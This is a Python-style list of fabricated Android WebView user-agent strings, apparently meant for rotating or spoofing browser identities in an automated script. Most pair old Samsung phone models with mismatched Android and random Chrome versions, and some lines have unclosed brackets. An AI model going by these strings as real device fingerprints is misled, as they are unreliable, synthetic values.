ua = ["Mozilla/5.0 (Linux; Android 14; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.3760.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.4486.99 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; SM-J320Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.4859.86 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.3841.61 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.5845.24 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.3628.33 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.3811.80 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/69.0.5266.24 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 15; SM-J320Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3365.41 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/69.0.5218.82 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/41.0.4541.93 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.4175.68 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; J320FN Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.5895.99 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/50.0.4993.61 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.4317.28 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3570.41 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.3880.71 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; J320FN Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/73.0.5219.60 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.3113.57 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.5915.73 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 15; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/84.0.3586.71 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/69.0.5035.32 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/42.0.3786.53 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; J320FN Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4747.35 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-J320Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5224.43 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.4442.35 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 15; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/47.0.3068.73 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/69.0.4097.71 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 15; SM-J320Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/72.0.5919.59 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 15; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5486.63 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.3714.26 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.4461.53 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.3484.74 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3709.93 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3530.91 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/46.0.4109.68 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.5846.27 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 15; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.5826.74 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-J320Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.4219.75 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/69.0.5544.91 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-J320Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5566.28 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/54.0.5719.37 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.3029.74 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.5687.61 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/41.0.3781.62 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.3204.38 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.5666.70 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-J320Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.5269.98 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3530.90 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.4132.79 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.3648.68 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; J320FN Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5236.38 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5048.79 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/50.0.5876.99 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-J320Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.3979.84 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.4128.27 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3743.38 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.3874.89 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 15; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.5365.66 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/64.0.3910.61 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/47.0.4304.26 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.4129.43 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/82.0.3144.69 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.4829.53 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5667.29 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.5490.30 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.5306.62 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.3086.71 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5215.28 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.5639.65 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; J320FN Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.5297.26 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.4305.48 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 15; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.5633.51 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5409.77 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4542.88 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5174.83 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.5865.81 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 15; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5892.50 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.5083.89 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.4920.38 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.3827.76 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-J320Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.4729.83 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.5651.85 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.4743.84 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.5991.52 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.3207.86 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; J320FN Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.5648.59 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.3913.97 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4385.64 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 15; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/63.0.3169.51 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3399.32 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/69.0.5064.77 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.5714.54 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.3825.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-J320Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/84.0.3816.33 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/48.0.3086.81 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.4099.48 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.5043.38 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4928.50 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/49.0.4369.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4534.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.3859.70 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.4982.45 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/69.0.5928.51 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.4511.91 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.3067.66 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.3375.22 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3930.29 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5065.79 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/41.0.3654.25 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/73.0.4355.69 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/63.0.5531.34 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.3211.70 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.3781.80 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.3706.76 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4235.42 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; J320FN Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.3661.40 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4265.47 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/82.0.3271.71 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/72.0.3147.38 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.4614.97 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.4687.94 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-J320Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.3894.56 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.3183.20 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4640.93 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3357.71 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.4014.52 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 15; SM-J320Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.4518.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.5102.78 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.3285.97 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3888.55 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.5159.89 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.5714.69 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.5576.81 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; J320FN Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5598.73 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.4221.74 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-M315F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) VenusBrowser/3.2.42 Chrome/113.0.5672.162 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-A127F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/434.0.0.36.115",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-J400F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/374.0.0.10.114",]
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X668C Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/435.0.0.42.112",]
